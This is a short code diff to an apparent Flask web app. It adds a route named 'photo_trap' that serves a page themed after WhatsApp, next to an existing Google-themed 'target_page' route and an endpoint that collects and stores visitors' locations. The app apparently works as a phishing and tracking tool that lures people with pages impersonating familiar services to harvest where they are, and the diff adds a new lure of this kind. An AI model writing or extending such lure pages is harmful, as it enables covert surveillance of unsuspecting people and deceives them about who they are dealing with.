@@ -30,6 +30,11 @@ def target_page():
     template = request.args.get('template', 'google')
     return render_template('index.html', template=template)
 
+@app.route('/photo')
+def photo_trap():
+    template = request.args.get('template', 'whatsapp')
+    return render_template('photo.html', template=template)
+
 @app.route('/send-location', methods=['POST'])
 def receive_location():
     global users, all_history, latest_location
